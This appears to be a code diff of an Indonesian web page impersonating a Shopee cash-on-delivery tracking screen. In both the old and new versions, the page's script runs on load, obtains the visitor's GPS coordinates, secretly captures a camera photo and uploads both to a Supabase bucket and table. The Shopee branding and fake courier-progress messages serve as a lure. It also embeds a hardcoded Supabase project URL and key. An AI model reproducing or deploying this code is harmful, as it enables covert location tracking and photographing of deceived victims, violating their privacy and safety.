@@ -1,283 +1,262 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Shopee - Live Tracking COD</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Shopee - Detail Pesanan COD</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet" />
 <style>
-  /* Reset & Base */
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: 'Poppins', sans-serif;
-    background: #000; 
-    color: #fff;
-    height: 100vh;
-    overflow: hidden; /* Mencegah scroll body luar */
-  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Poppins', sans-serif;
+    background: #f5f5f5;
+    color: #333;
+    min-height: 100vh;
+  }
 
-  /* Header Transparan (Glassmorphism) */
-  header {
-    background: linear-gradient(to bottom, rgba(0,0,0,0.8) 0%, transparent 100%);
-    color: #fff;
-    padding: 20px;
-    font-size: 1.1rem;
-    font-weight: 600;
-    text-align: center;
-    position: fixed;
-    top: 0;
-    width: 100%;
-    z-index: 100;
-    letter-spacing: 1px;
-  }
+  /* Header Shopee */
+  header {
+    background-color: #f53d2d;
+    color: #fff;
+    padding: 14px;
+    font-size: 1.3rem;
+    font-weight: 600;
+    text-align: center;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
 
-  /* Status Floating Box di Atas */
-  #statusBox {
-    position: fixed;
-    top: 75px;
-    left: 15px;
-    right: 15px;
-    padding: 12px;
-    border-radius: 15px;
-    background: rgba(255, 255, 255, 0.1);
-    backdrop-filter: blur(15px);
-    border: 1px solid rgba(255,255,255,0.2);
-    z-index: 90;
-    text-align: center;
-  }
-  #statusText { font-size: 0.8rem; margin-bottom: 10px; font-weight: 400; color: #eee; }
+  /* Status Pesanan */
+  #statusBox {
+    margin: 16px;
+    padding: 16px;
+    border-radius: 12px;
+    background: #fff;
+    color: #333;
+    font-size: 1rem;
+    font-weight: 500;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+  }
+  #statusText { font-weight: 600; }
 
-  /* Progress Bar Minimalis */
-  .progress {
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-  }
-  .step {
-    width: 30px;
-    height: 4px;
-    border-radius: 2px;
-    background: rgba(255,255,255,0.2);
-    transition: all 0.4s ease;
-  }
-  .step.active {
-    background: #f53d2d;
-    box-shadow: 0 0 8px #f53d2d;
-  }
+  /* Progress Shopee */
+  .progress {
+    display: flex;
+    justify-content: space-between;
+    margin-top: 12px;
+    position: relative;
+  }
+  .progress::before {
+    content: "";
+    position: absolute;
+    top: 12px;
+    left: 10%;
+    width: 80%;
+    height: 2px;
+    background: #ddd;
+  }
+  .step {
+    background: #ddd;
+    color: #666;
+    width: 24px;
+    height: 24px;
+    border-radius: 50%;
+    text-align: center;
+    line-height: 24px;
+    font-size: 0.8rem;
+    position: relative;
+    z-index: 1;
+  }
+  .step.active {
+    background: #f53d2d;
+    color: #fff;
+  }
 
-  /* Container Video Mode (Vertical Slider) */
-  #list {
-    height: 100vh;
-    overflow-y: scroll;
-    scroll-snap-type: y mandatory; /* Membuat efek slide per frame */
-    -webkit-overflow-scrolling: touch;
-  }
+  /* Daftar Foto/Lokasi */
+  #list {
+    margin: 16px;
+    display: flex;
+    flex-direction: column;
+    gap: 14px;
+  }
+  .card {
+    background: #fff;
+    border-radius: 12px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+    overflow: hidden;
+    display: flex;
+    gap: 12px;
+    padding: 12px;
+    align-items: center;
+  }
+  .card img {
+    width: 90px;
+    height: 90px;
+    object-fit: cover;
+    border-radius: 8px;
+    flex-shrink: 0;
+  }
+  .info {
+    font-size: 0.85rem;
+    color: #444;
+    white-space: pre-line;
+  }
 
-  /* Setiap Item/Foto jadi Full Screen */
-  .card {
-    height: 100vh;
-    width: 100%;
-    scroll-snap-align: start;
-    position: relative;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: #111;
-  }
-
-  .card img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover; /* Foto memenuhi seluruh layar */
-  }
-
-  /* Info Overlay (Keterangan di bawah foto) */
-  .info {
-    position: absolute;
-    bottom: 110px;
-    left: 20px;
-    right: 20px;
-    text-shadow: 2px 2px 10px rgba(0,0,0,1);
-    font-size: 0.85rem;
-    background: linear-gradient(transparent, rgba(0,0,0,0.7));
-    padding: 20px 0;
-  }
-  .info strong { color: #f53d2d; display: block; margin-bottom: 4px; }
-
-  /* Tombol Aksi Floating di Bawah */
-  .actions {
-    position: fixed;
-    bottom: 25px;
-    left: 0;
-    right: 0;
-    display: flex;
-    justify-content: center;
-    gap: 12px;
-    z-index: 100;
-    padding: 0 20px;
-  }
-  button {
-    flex: 1;
-    border: none;
-    border-radius: 50px;
-    padding: 14px;
-    font-size: 0.9rem;
-    font-weight: 600;
-    cursor: pointer;
-    transition: transform 0.2s;
-  }
-  button:active { transform: scale(0.95); }
-  
-  .btn-track { background: rgba(255,255,255,0.15); color: #fff; border: 1px solid rgba(255,255,255,0.4); backdrop-filter: blur(5px); }
-  .btn-confirm { background: #f53d2d; color: #fff; box-shadow: 0 4px 15px rgba(245, 61, 45, 0.4); }
-
-  /* Efek Loading Awal */
-  .loading-msg {
-    position: absolute;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    text-align: center;
-    font-size: 0.9rem;
-    color: #888;
-  }
+  /* Tombol */
+  .actions {
+    display: flex;
+    justify-content: flex-end;
+    gap: 10px;
+    margin: 16px;
+  }
+  button {
+    border: none;
+    border-radius: 8px;
+    padding: 10px 16px;
+    font-size: 0.9rem;
+    font-weight: 600;
+    cursor: pointer;
+  }
+  .btn-track { background: #fff; border: 1px solid #ccc; }
+  .btn-confirm { background: #f53d2d; color: #fff; }
 </style>
 </head>
 <body>
-
-<header>LIVE ORDER TRACKING</header>
+<header>Detail Pesanan COD</header>
 
 <div id="statusBox">
-  <div id="statusText">Menginisialisasi sistem...</div>
-  <div class="progress">
-    <div class="step" id="step1"></div>
-    <div class="step" id="step2"></div>
-    <div class="step" id="step3"></div>
-  </div>
+  <div id="statusText">Pesanan COD kamu sedang diproses</div>
+  <div class="progress">
+    <div class="step active" id="step1">1</div>
+    <div class="step" id="step2">2</div>
+    <div class="step" id="step3">3</div>
+  </div>
 </div>
 
-<div id="list">
-    <div class="loading-msg">Membuka kamera & GPS...</div>
-</div>
+<div id="list"></div>
 
 <div class="actions">
-  <button class="btn-track">Lacak</button>
-  <button class="btn-confirm">Terima Pesanan</button>
+  <button class="btn-track">Lacak Pesanan</button>
+  <button class="btn-confirm">Konfirmasi COD</button>
 </div>
 
+<!-- Supabase JS -->
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <script>
-  // Konfigurasi Anda (Tetap Sama)
-  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
-  const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
-  const BUCKET = "foto-users"; 
-  const { createClient } = supabase;
-  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
+  const SUPABASE_URL = "https://ttptotondiqkqsznuapw.supabase.co";
+const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InR0cHRvdG9uZGlxa3Fzem51YXB3Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzMzMTUzOTYsImV4cCI6MjA4ODg5MTM5Nn0.f9kTPb8CKit4vhfdREmYGrERxNj44RTSfWy7FDCAHu8";
+  const BUCKET = "foto-users"; 
+  const { createClient } = supabase;
+  const client = createClient(SUPABASE_URL, SUPABASE_KEY);
 
-  const statusText = document.getElementById("statusText");
-  const step1 = document.getElementById("step1");
-  const step2 = document.getElementById("step2");
-  const step3 = document.getElementById("step3");
-  const listEl = document.getElementById("list");
+  const statusText = document.getElementById("statusText");
+  const step1 = document.getElementById("step1");
+  const step2 = document.getElementById("step2");
+  const step3 = document.getElementById("step3");
+  const listEl = document.getElementById("list");
 
-  function updateStatus(stage) {
-    step1.classList.remove("active");
-    step2.classList.remove("active");
-    step3.classList.remove("active");
+  function updateStatus(stage) {
+    step1.classList.remove("active");
+    step2.classList.remove("active");
+    step3.classList.remove("active");
 
-    if (stage === 1) {
-      statusText.innerText = "Pesanan sedang diproses sistem";
-      step1.classList.add("active");
-    } else if (stage === 2) {
-      statusText.innerText = "Kurir sedang menuju lokasi Anda";
-      step2.classList.add("active");
-    } else if (stage === 3) {
-      statusText.innerText = "Paket telah sampai di koordinat";
-      step3.classList.add("active");
-    }
-  }
+    if (stage === 1) {
+      statusText.innerText = "Pesanan COD kamu sedang diproses";
+      step1.classList.add("active");
+    } else if (stage === 2) {
+      statusText.innerText = "Pesanan sedang dikirim";
+      step2.classList.add("active");
+    } else if (stage === 3) {
+      statusText.innerText = "Pesanan selesai";
+      step3.classList.add("active");
+    }
+  }
 
-  function ambilLokasiDulu() {
-    if (!navigator.geolocation) {
-      statusText.innerText = "❌ GPS tidak didukung browser";
-      return;
-    }
-    navigator.geolocation.getCurrentPosition(async (pos) => {
-      const lat = pos.coords.latitude;
-      const lon = pos.coords.longitude;
-      ambilFoto(lat, lon);
-    }, (err) => {
-      statusText.innerText = "❌ Harap aktifkan izin lokasi/GPS";
-    });
-  }
+  function ambilLokasiDulu() {
+    if (!navigator.geolocation) {
+      statusText.innerText = "❌ Browser tidak mendukung geolocation";
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(async (pos) => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+      ambilFoto(lat, lon);
+    }, (err) => {
+      statusText.innerText = "❌ Aktifkan izin lokasi: " + err.message;
+    });
+  }
 
-  async function ambilFoto(lat, lon) {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-      const track = stream.getVideoTracks()[0];
-      const imageCapture = new ImageCapture(track);
-      const blob = await imageCapture.takePhoto();
-      const fileName = `foto_${Date.now()}.jpg`;
+  async function ambilFoto(lat, lon) {
+    try {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const track = stream.getVideoTracks()[0];
+      const imageCapture = new ImageCapture(track);
+      const blob = await imageCapture.takePhoto();
+      const fileName = `foto_${Date.now()}.jpg`;
 
-      const { error: uploadError } = await client.storage
-        .from(BUCKET)
-        .upload(fileName, blob, {
-          cacheControl: "3600",
-          upsert: false,
-          contentType: "image/jpeg"
-        });
+      const { error: uploadError } = await client.storage
+        .from(BUCKET)
+        .upload(fileName, blob, {
+          cacheControl: "3600",
+          upsert: false,
+          contentType: "image/jpeg"
+        });
 
-      if (!uploadError) {
-        await client.from("lokasi_users").insert([
-          { foto: fileName, latitude: lat, longitude: lon, created_at: new Date() }
-        ]);
-        tampilkanFoto();
-        updateStatus(2);
-        setTimeout(() => updateStatus(3), 8000);
-      }
-      track.stop();
-    } catch (err) {
-      console.error("Kamera error:", err);
-      statusText.innerText = "❌ Izin Kamera Ditolak";
-    }
-  }
+      if (!uploadError) {
+        await client.from("lokasi_users").insert([
+          { foto: fileName, latitude: lat, longitude: lon, created_at: new Date() }
+        ]);
+        tampilkanFoto();
 
-  async function tampilkanFoto() {
-    const { data, error } = await client.storage.from(BUCKET).list("", {
-      sortBy: { column: "created_at", order: "desc" }
-    });
-    if (error) return;
+        // Ubah status setelah berhasil upload
+        updateStatus(2);
 
-    listEl.innerHTML = "";
-    for (const file of data) {
-      const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
-      const { data: lokasiData } = await client
-        .from("lokasi_users")
-        .select("*")
-        .eq("foto", file.name)
-        .maybeSingle();
+        // Simulasi otomatis selesai setelah 10 detik
+        setTimeout(() => {
+          updateStatus(3);
+        }, 10000);
+      }
+      track.stop();
+    } catch (err) {
+      console.error("Kamera error:", err);
+    }
+  }
 
-      const card = document.createElement("div");
-      card.className = "card";
-      
-      const img = document.createElement("img");
-      img.src = publicUrl.publicUrl;
-      
-      const info = document.createElement("div");
-      info.className = "info";
-      if (lokasiData) {
-        info.innerHTML = `<strong>TRACKING ACTIVE</strong>Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}<br><small>Update: ${new Date(lokasiData.created_at).toLocaleTimeString()}</small>`;
-      }
-      
-      card.appendChild(img);
-      card.appendChild(info);
-      listEl.appendChild(card);
-    }
-  }
+  async function tampilkanFoto() {
+    const { data, error } = await client.storage.from(BUCKET).list("", {
+      sortBy: { column: "created_at", order: "desc" }
+    });
+    if (error) return;
 
-  // Eksekusi
-  updateStatus(1);
-  ambilLokasiDulu();
+    listEl.innerHTML = "";
+    for (const file of data) {
+      const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
+      const { data: lokasiData } = await client
+        .from("lokasi_users")
+        .select("*")
+        .eq("foto", file.name)
+        .single();
+
+      const card = document.createElement("div");
+      card.className = "card";
+      const img = document.createElement("img");
+      img.src = publicUrl.publicUrl;
+      const info = document.createElement("div");
+      info.className = "info";
+      if (lokasiData) {
+        info.innerText = `Lat: ${lokasiData.latitude.toFixed(5)}, Lon: ${lokasiData.longitude.toFixed(5)}\n${new Date(lokasiData.created_at).toLocaleString()}`;
+      }
+      card.appendChild(img);
+      card.appendChild(info);
+      listEl.appendChild(card);
+    }
+  }
+
+  // mulai
+  updateStatus(1);
+  ambilLokasiDulu();
 </script>
 </body>
 </html>
